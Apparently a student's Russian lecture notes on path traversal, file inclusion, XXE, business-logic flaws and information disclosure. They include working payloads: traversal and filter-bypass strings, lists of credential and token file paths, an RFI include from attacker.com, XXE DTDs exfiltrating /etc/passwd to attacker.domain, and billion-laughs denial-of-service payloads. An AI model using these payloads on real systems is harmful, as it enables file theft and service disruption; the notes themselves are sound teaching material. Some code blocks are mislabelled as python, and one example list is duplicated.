![](./Materials/Lect7%20-%20Серверные%20уязвимости%20веб-приложений.%20Часть%204-1762103575618.jpeg)

# LFR

> Path treaversal (Directory Traversal) - веб уязвимость, которая пощзволяет атакующему **читать** произвольные файлы на системе

Пример:

https\://example.com/load_image?p\===../../../etc/passwd== -> /var/www/html/../../../etc/passwd -> /etc/passwd

### Как выглядит в исходном коде

```python
@WebServlet("/download")
public class FileDownloadServlet extends HttpServlet {
	protected void doGet(HttpServletRequest request, HttpServletResponse response) {
		String fileName = request.getParameter("file");
		File file = new File(fileName);
		
		try (FileInputStream fis = new FileInputStream(file)) {
			IOUtils.copy(fis, response.getOutputStream());
...
```

заголовок Content-Disposition: attachment -> файлик не отображается в браузере, а скачивается

### Proof of Concept (PoC)

> PoC - стандартное доказательство существования уязвимости

Linux: /etc/passwd -> всегда существует файл, хранятся логины пользователей, а также не особо опасен
Windows: \windows\win.ini -> системные данные

### Цели атакующего
- Исходный код приложений
- Файлы с паролями/уз
- Чувствительные файлы ос
- Запись файлов -> RCE

### Чувствительные файлы ОС:

- Информация об ОС:
	- /etc/issue
	- /etc/group
	- /etc/hosts
	- /etc/motd
- Сеть
	- /proc/net/arp
	- /proc/net/route
	- /proc/net/tcp
	- /proc/net/udp
- Процессы
	- /proc/\[0-9]\*/fd/\[0-9]\* // PID, file descriptor
	- /proc/self/environ
	- /proc/version
	- /proc/cmdline
	- /proc/sched_debug
	- /proc/mounts
- Текущий путь
	- /proc/self/cwd/index.php
	- /proc/self/cwd/main.py
- Индексирование
	- /var/lib/mlocate/mlocate.db
	- /var/lib/plocate/plocate.db
	- /var/lib/mlocate.db
- Пароли и история
	- /etc/passwd
	- /etc/shadow
	- /home/$USER/.bash_history
	- /home/$USER/.ssh/id_rsa
	- /etc/mysql/my.cnf
- Kubernetes
	- /run/secrets/kubernetes.io/serviceaccount/token
	- /run/secrets/kubernetes.io/serviceaccount/namespace
	- /run/secrets/kubernetes.io/serviceaccount/certificate
	- /var/run/secrets/kubernetes.io/serviceaccount
- Windows
	- c:/inetpub/logs/logfiles
	- c:/inetpub/wwwroot/global.asa
	- c:/inetpub/wwwroot/index.asp
	- c:/inetpub/wwwroot/web.config
	- c:/sysprep.inf
	- c:/sysprep.xml
	- c:/sysprep/sysprep.inf
	- c:/sysprep/sysprep.xml
	- c:/system32/inetsrv/metabase.xml
	- c:/sysprep.inf
	- c:/sysprep.xml
	- c:/sysprep/sysprep.inf
	- c:/sysprep/sysprep.xml
	- c:/system volume information/wpsettings.dat
	- c:/system32/inetsrv/metabase.xml
	- c:/unattend.txt
	- c:/unattend.xml
	- c:/unattended.txt
	- c:/unattended.xml
	- c:/windows/repair/sam
	- c:/windows/repair/system

# LFI

> **Local File Inclusion (LFI)** - позволяет загрузить и исполнить файл с операционной системы. В данном случае, если на системе будет файл с вредоносной нагрузкой (php-shell), мы получим исполнение кода. Особенно опасно на PHP

https\://example.com/load_image?p\===../../../shell.php== -> RCE

### Как выглядит в исходном коде

```python
import importlib.util
from django.http import HttpResponse

def load_module(request):
	module_path = request.GET.get('module')
	spec = importlib.util.spec_from_file_location("module", module_path)
	module = importlib.util.module_from_spec(spec)
	spec.loader.exec_module(module)
```

### Получение RCE через LFI (LFI2RCE)

- Загрузка и вызов шелла (очевидно)
- Mail-log системы
	- Отправляется письмо к внутреннему пользователю
	- Происходит LFI к mail-логу
	```
	/var/mail/<USERNAME>
	/var/spool/mail/<USERNAME>
	```
- Сессии PHP
	- Регистрация пользователя, содержащего нагрузку в поле объекта (например, имени)
	- Происходит LFI к хранилищу сессий
	```
	/var/lib/php5/sess_[PHPSESSID]
	```
- Access-лог веб-сервера
	- Нагрузка помезяется в User-Agent или параметр Get-запроса
	- Происходит LFI к лог файлу
	```
	/var/log/apache2/access.log
	/var/log/apache/access.log
	/var/log/apache2/error.log
	/var/log/apache/error.log
	/usr/local/apache/log/error_log
	/usr/local/apache2/log/error_log
	/var/log/nginx/access.log
	/var/log/nginx/error.log
	/var/log/httpd/error_log
	```
- Аналогичная техника с логами ssh

# RFI

> Remote File Inclusion (RFI) - позволяет загрузить и исполнить внешний файл, т.е. не обязательно хранящийся на системе.
> Этот вариант является более критичным, так как для эксплуатации нам не требуется предварительно загружать файл на систему/пытаться отравить уже существующие файлы.

https\://example.com/load_image?p\===http\://attacker.com/shell.php== -> RCE

### Как это может выглядеть в исходном коде

```python
app.get('/load-config', (req, res) => {
	const configUrl = req.query.config;
	const config = require(configUrl);
	fetch(configUrl).then(response => eval(response.text()));
});
```

### Наиболее популярные параметры для LFR / LFI / RFI

- ?cat={payload}
- ?dir={payload}
- ***?action={payload}***
- ?board={payload}
- ?date={payload}
- ?detail={payload}
- ***?file={payload}***
- ***?download={payload}***
- ***?path={payload}***
- ?folder={payload}
- ?prefix={payload}
- ?include={payload}
- ***?page={payload}***
- ?inc={payload}
- ?locate={payload}
- ?show={payload}
- ?doc={payload}
- ?site={payload}
- ?type={payload}
- ***?view={payload}***
- ?content={payload}
- ?document={payload}
- ?layout={payload}
- ?mod={payload}
- ?conf={payload}

### Обход защиты

- Использование абсолютного пути (`filename=/etc/passwd`)
- Использование кодировок (`filename=%2e%2e%2f/etc/passwd`; `filename=%252e%252e%252f/etc/passwd`)
- Использование нулевого байта (`filename=../../etc/passwd%00.png`)
- Нерекурсивное удаление (`filename=..././..././etc/passwd`, после удалений `../` путь превратится в `filename=../../etc/passwd`)
- Проверка начала пути (`filename=/var/www/../../etc/passwd`)
- Разногласия парсинга (`filename=..;/..;/etc/passwd`)
- Path Truncation - в некоторых ЯП длинные имена файлов обрезаются
	```
	http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
	http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
	http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
	http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
	```
- (RFI, Windows) Обход блокировки с использованием smb share (`page=\\10.0.0.1\share\shell.php`)
- Использование фильтров PHP

### Использование различных протоколов

- Java URL
	```
	url:file:///etc/passwd
	url:http://127.0.0.1:8080
	```
- data:// (RCE в случае RFI)
	```
	data://text/plain;<base64-payload>,txt
	```
- zip:// и rar:// (нужен соответствующий шелл)
	```
	zip:///var/www/html/shell.zip
	```
- php://filter (RCE possible)
	```
	php://filter/convert.base64-decode/
	resource=data://plain/text,<base64-
	payload>.txt
	```
- php://fd (чтение)
	```
	php://fd/3
	```
- expect:// (RCE; вживую почти никогда не увидите)
	```
	expect://ls
	```
- php://imput - payload передаётся в теле POST
- phar:// - десериализация
- остальное тут https://www.php.net/manual/en/wrappers.php

### Защита

- Не использовать пользовательский ввод в API ОС
- Валидация пользовательского ввода
- Добавлять префикс пути, канонизировать путь, после чего сравнивать начало с ожидаемым префиксом
Пример:
```
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
	// process file
}
```

### Читщиты

- https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/
- https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion
- https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html

# XXE (XML eXternal Entity)

> XXE - это веб уязвимость, которая позволяет злоумышленнику вмешиваться в процесс обработки XML-данных приложением

XML - формат передачи данных

```xml
<?xml version="1.0" encoding="UTF-8"?>
<product>

<name>flag</name>
<price>1337</price>

</product>
```

### DTD Document Type Definition

`<!DOCTYPE foo []>`
- секция XML документа, определяющая стректуру докуемнта, типы данных и прочую информацию
- Вводится ключевым словом DOCTYPE
- **Ключевым является то, что в нем можно определять сущности XML (XML Entities)**
- Бывает внутренним и внешним (internal/external DTD)

### XML Entities

XML-сущность - это структура данных, обычно содержащая корректный XML-код, на который будут ссылаться несколько раз в документе. Её также можно рассматривать как заглушку для некоторого контента, к которому можно обращаться и обновлять в одном месте, а также распространять по всему документу с минимальными усилиями, подобно переменным в языке программирования.

Бывают трёх видов:
- Внутренние (Internal)
- Внешние (External)
- Parameter

##### XML Internal Entities
- Определяются **локально** внутри DTD
- Часто используются как замена посторяющихся строк 
- Обращение через `&param;`

```xml
<!DOCTYPE foo [ <!ENTITY myentity "flag" > ]>
...
<product>

<name>&myentity;</name>
<price>1337</price>

</product>
```

##### XML External Entities
- Определены не локально, т.е. на внешнем ресурсе или ином файле
- Бывают приватными и публичными
- В теле XML на них можно ссылаться аналогично внутренним сущностям

Private Entity
```xml
<!DOCTYPE foo [ <!ENTITY name SYSTEM "URI"> ]>
<!DOCTYPE foo [ <!ENTITY name SYSTEM "http://example.com/definition.xml"> ]>
```

Public Entity
```xml
<!DOCTYPE foo [ <!ENTITY name PUBLIC "public_id" "URI"> ]>

<!ENTITY foo PUBLIC "-//W3C//TEXT companyinfo//EN" "http://example.com/definition.xml">
```

Эксплуатация XXE происходит через внешние сущности

##### XML Parameter entities
- Существуют строго внутри DTD
- Имеют слегка отличающийся синтаксис при ссылке (% вместо &)

```xml
<!ENTITY % name SYSTEM "URI">
<!ENTITY % name 'HSE'>
<!ENTITY Title 'The greatest University is %name;' >
```

##### Unparsed External Entities
- XML Entity не обязана содержать валидный XML-синтаксис
- В некоторых обработчиках XML имеется возможность явно указать на отсутствие необходимости обрабатывать данные при помощи NDATA (TYPE - тип данных)
- Таким образом можно получить доступ к бинарному контенту

```xml
<!ENTITY name SYSTEM "URI" NDATA TYPE>
<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
```

### Примеры XXE атак:

http\://internal.site в первой строке заменяем на другую строку
```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://internal.site" > ]>
...
<product>

<name>&ext;</name>
<price>1337</price>

</product>
```
->
```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
...
<product>

<name>&ext;</name>
<price>1337</price>

</product>
```


### Пример в исходном коде:

```python
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document document = builder.parse(new InputSource(inputStream));
```

### Возможное влияние:

- Чтение файлос ОС
- SSRF
- DoS
- RCE

Разновидности:
- Видимые: результат эксплуатации виден в ответах приложения
- Слепые: результат эксплуатации не виден в ответах приложения
- Экзотические

### SSRF via XXE

Изначальный xml такой:
```xml
<?xml version="1.0" encoding=«UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://internal.site" > ]>
<product>

<name>&ext;</name>
<price>1337</price>

</product>
```

Чтение файлов
("file\:///etc/passwd" во второй строке)
```xml
<?xml version="1.0" encoding=«UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
<product>

<name>&ext;</name>
<price>1337</price>

</product>
```
->
```
Invalid product Name: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

Как проследить результат слепой XXE: отправить запрос на какой-то сервер, к которому есть доступ

Возможнн ли листинг директории через XXE? - Нет, нужно чётко знать нужный файл. НО! Если у нас java, то обработчик file:// выводит листинг, если на вход передана директория

### Слепые XXE: детектирование и эксплуатация
- Обнаружение SSRF на подконтрольный сервер (HTTP, DNS, FRP, иные протоколы)
- Эксплуатация:
	- Вывод данных на внешний сервер
	- Вывод данных через сообщения об ошибках
	- Вывод данных через переопределение локального DTD

### Слепые XXE: вывод данных на внешний сервер
1. Атакующий создаёт на своём сервере dtd-файл с XML-сущностями. Задача данного файла - прочитать файл и передать содержимое на сервер атакующего
2. Уязвимому приложению подаётся на вход внешняя сущность, выполняющая обращение к внешнему dtd на сервере атакующего

malicious.dtd (хранится на сервере атакующего):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://
attacker.domain/?x=%file;'>">
%eval;
%exfiltrate;
```

На атакуемом сервере:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.domain/malicious.dtd"> %xxe;]>
```

Какая проблема может быть и почему? - выведется одна строка и всё

### Слепая XXE через сообщения об ошибках: 
Принцип тот же, просто в конце мы не отправляем данные на сервер, а триггерим ошибку

malicious.dtd:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///
nonexistent/%file;'>">
%eval;
%error;
```

Сервер:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.domain/malicious.dtd"> %xxe;]>
```

Ответ:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### Чтение файлов: возможная проблема

```xml
<?xml version="1.0" encoding=«UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
<product>

<name>&ext;</name>
<price>1337</price>

</product>
```
->
`Invalid product Name: root:x:0:0:root:/root:/bin/bash`

Что не так и почему? 

### Ранее обозначенные проблемы и пути их решения:
1. При отправке финального запроса на внешний сервер может быть отправлена часть данных. Это может происходить из-за нестандартного типа данных или содержания в нем спец символов. Решение: использовать другой протокол, использовать фильтры php или использовать CDATA
2. При чтении файла с ОС может выводиться одна строка. Это может происходить из-за того, что XML-обработчик встретил символ переноса строки и воспринял его как конец файла. Решение то же самое

### CDATA and php filters
1. Можно использовать фильтры php для преобразования данных в другой формат
`php://filter/convert.base64-encode/resource=file:///etc/passwd`
2. Можно обернуть вывод в CDATA при помощи parameter entities (использовать CDATA вне DTD ни один нормальный обработчик не позволит)
```xml
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY content '%start;%file;%end;'>">
%wrapper;
]>
```
(В реальной эксплуатации потребуется использовать внешний DTD для этой техники)

Почему нельзя использовать только Internal DTD для использования CDATA и эксфильтрации данных? - Использование parameter entity для определения другой parameter entity разрешено спецификацией, но запрещено почти во всех обработчиках XML

Есть обход.

### Слепые XXE: вывод данных через переопределение локального DTD

- Может быть использовано, если невозможно обратиться к внешнему DTD на сервере атакующего
- Необходимо, чтобы на сервере был внешний DTD, определённый разработчиками. Также, необходимо знать (получить) как минимум одну определённую сущность. Получить его можно попыткой указания пути в качестве внешней сущности или при помощи другой уязвимости, позволяющей читать файлы ОС
- Смысл техники заключается в переопределении сущности в локально расположенном DTD. В данном случае будет возможно использование parameter entity для определения другой parameter entity (для XML эта сущность будет считаться причастной к внешнему DTD)

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/
schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
&#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
(Считаем, что custom_entity определена в локальном dtd)

### Экзотические XXE
- Xinclude (способ сборки XML-документов из частей)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
- Загрузка SVG (подобным образом можно использовать любые XML-valid файлы, например, docx, xlsx и пр)
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
- SOAP-запросы (формат построения POST запроса)
```xml
<soap:Body>
	<foo>
		<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
	</foo>
</soap:Body>
```
- Изменение content-Type Post-запроса на text/xml (чаще всего может сработать, если исходный запрос был в json)

### DoS vis XXE
- Billion Laugh attack
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
- YAML attack (то же самое)
```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
- Parameters Laugh Attack
```xml
<!DOCTYPE r [
<!ENTITY % pe_1 "<!---->">
<!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
<!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
<!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
%pe_4;
]>
<r/>
```

### RCE в XXE
Аналогично RCE в SSRF
- Использование фильтров php
- Использование expect://
- Использование протокола gopher://

### Защита:
- **Отключение возможности разрешения внешних сущностей XML-обработчиком** (в некоторых популярных библиотеки, для GO внешние сущности отключены по умолчанию)
- Отключить XInclude
- Использовать корректную обработку для конкретных типов данных (для экзотических XXE)

### Читщиты

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md

# Business Logic Vulnerabilities

> Бизнес-логика - это код, который имитирует реальные бизнес-операции/решения, а не код, который управляет взаимодействием пользователя с приложением.

> Уязвимости бизнес-логики — это недостатки в проектировании и реализации приложения, которые позволяют злоумышленнику вызвать непреднамеренное поведение. Это потенциально позволяет злоумышленникам манипулировать легитимной функциональностью для достижения вредоносной цели.
> Эти недостатки, как правило, возникают из-за неспособности предвидеть возможные необычные состояния приложения и, как следствие, неспособности безопасно их обрабатывать.

### Особенности уязвимостей бизнес-логики

- Сложно структуризировать
- Невозможно обнаружить при помощи сканера
- Поиск подобных уязвимостей обычно включает в себя выявление и проверку предположений разработчика о том, как кто-то использует приложение, а не технических проблем, связанных с обработкой данных
- Чаще встречаются в сложных приложениях, разработчики которых сами не до конца понимают, как они работают

### Какие типы уязвимостей бизнес-логики бывают

- Доверие данным со стороны клиента
- Некорректная обработка нестандартных данных
- Ошибочные предположения о поведении пользователей
- Domain-Specific уязвимости

### Примеры

Общие:

- Обход аутентификации или отдельных ее факторов
- Возможность смены пароля другому пользователю
- Возможность обхода ограничений на email-адрес из- за слишком длинного значения
- Возможность самостоятельно поднять себе права в системе (roles admin -> super admin)
- Атаки типа Encryption Oracle: приложение позволяет пользователю зашифровать данные внутренним ключом и увидеть результат
- Email address parser discrepancies

![](./Materials/Lect7%20-%20Серверные%20уязвимости%20веб-приложений.%20Часть%204-1762121318378.jpeg)

Коммерция и торговля:

- Использование негативных цен на товары
- Integer overflow в счетчике цены товара
- Переиспользование скидочного купона
- Доверие цене, сообщенной с клиентской стороны
- Нарушение правильной последовательности действий (подтверждение покупки до ее оплаты)
- Возможность получить подарочный сертификат дешевле его стоимости (бесконечные деньги)

Фин сектор:

- Подтверждение нескольких переводов одним OTP
- Управление стоимостью ценных бумаг (резкое внесение большой суммы перед пересчетом и резкое снятие денег после)
- Проблемы в конвертации валют

![](./Materials/Lect7%20-%20Серверные%20уязвимости%20веб-приложений.%20Часть%204-1762121956833.jpeg)

Соц сети:

- Возможность повторной отправки (накручивания) положительных оценок
- Возможность просмотра частных групп/постов/страниц и т.д.

Игровая индустрия:
- Возможность повторной отправки (накручивания) положительных оценок
- Возможность просмотра частных групп/постов/страниц и т.д.

### Защита

- Убедиться, что разработчики понимают домен приложения и осознают логику работы их приложения
- Избегать конкретных предположений о единственно правильном поведении пользователей и поведении составных частей приложения

Варианты достижения:
- Вести четкую документацию дизайна приложения и диаграммы потоков данных
- Отмечать предположения о поведении пользователей на каждом из этапов
- Писать чистый и понятный код (насколько это возможно)
- Отмечать отсылки к другим частям кода. Обдумывать, возможны ли какие-то последствия от использования данных зависимостей

# Information Disclosure

> **Information Disclosure** — ситуация, когда веб-приложение непреднамеренно раскрывает конфиденциальную информацию своим пользователям.

В зависимости от контекста, приложения могут раскрывать потенциальному злоумышленнику любую информацию, включая:
- Данные о других пользователях, например, имена пользователей или финансовую информацию
- Конфиденциальные или коммерческие данные
- Техническую информацию о веб-сайте и его инфраструктуре

### Примеры

- Раскрытие имён скрытых каталогов, их структуры и содержимого через файл robots.txt или список каталогов
- Предоставление доступа к файлам исходного кода через временные резервные копии;
-  Явное упоминание имён таблиц или столбцов базы данных в сообщениях об ошибках
- Необоснованное раскрытие конфиденциальной информации, такой как данные кредитных карт
- Жестко-закодированные (Hardcoded) API-ключи, IP-адреса, учетные данные и т.д. в исходном коде
- Намеки на наличие или отсутствие ресурсов, имён пользователей и т.д. с помощью незначительных различий в поведении приложения.

### Способы поиска информации

- Фаззинг
- Использование сканера
	- В Burp Suite есть раздел Engagement Tools, способный просматривать комментарии в фронтент-коде и обнаруживать дополнительные директории приложения
	- Есть много инструментов и worlist-ов, предназначенных для сбора информации. В некоторые инструменты поиска директорий данные тесты включены по умолчанию (напр. dirsearch)
- Ручное обнаружение

![|287x67](./Materials/Lect7%20-%20Серверные%20уязвимости%20веб-приложений.%20Часть%204-1762122619969.jpeg)

### Некоторые источники получения информации

- Файлы для веб-краулеров (`/robots.txt`, `/sitemap.xml`, `* /.DS_Store`)
- Листинг директорий
- Комментарии разработчиков
- Сообщения об ошибках
- Дебаг-режимы веб-приложений
- Мисконфигурации (напр, разрешённый метод TRACE)
- Персональные страницы пользователей
- Определённые секции веб-приложений (например, Contacts)
- Бекап файлы (`.bak`, `.php~`, ...)
- Version Control History (`/.git`)

### Защита

- Убедиться, что все причастные к работе веб-приложения осознают, что будет являться чувствительной информацией
- Проводить аудит кода на предмет доступности чувствительной информации публично
- Использовать максимально общие сообщения об ошибках, насколько это возможно
- Убедиться, что приложение работает не в дебаг-режиме
- Убедиться, что имеется полное понимание настроек конфигурации и возможных проблем безопасности сторонних компонентов